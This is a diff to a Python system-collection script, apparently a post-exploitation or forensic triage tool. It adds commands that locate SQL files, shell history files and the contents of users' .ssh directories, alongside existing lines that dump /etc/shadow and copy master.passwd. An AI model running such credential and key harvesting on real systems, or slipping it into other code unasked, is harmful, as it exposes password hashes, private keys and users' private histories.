@@ -171,6 +171,8 @@ def Gather_OS():
    os.system("uname -a > distro_kernel.txt")
    os.system("df -hT > filesystem.txt")
    os.system("free -lt > memory.txt")
+   os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
+   os.system("find /home -type f -iname '.*history' > HistoryList.txt")
    os.system("cat /proc/cpuinfo > cpuinfo.txt")
    os.system("cat /proc/meminfo > meminfo.txt")
    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
@@ -196,6 +198,13 @@ def GetCredentials():
     os.system('getent passwd > passwd.txt')
     os.system('getent shadow > shadow.txt')
     os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
+    os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
+    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
+    content = ''
+    for f in sshfiles:
+       content = content + '\n' + open(f).read()
+    open('SSH_Locations.txt','wb').write(content)
+    os.system("rm ssh_locations.txt ssh_contents.txt")
 
     if os.path.isfile("/etc/master.passwd") is True:
         shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
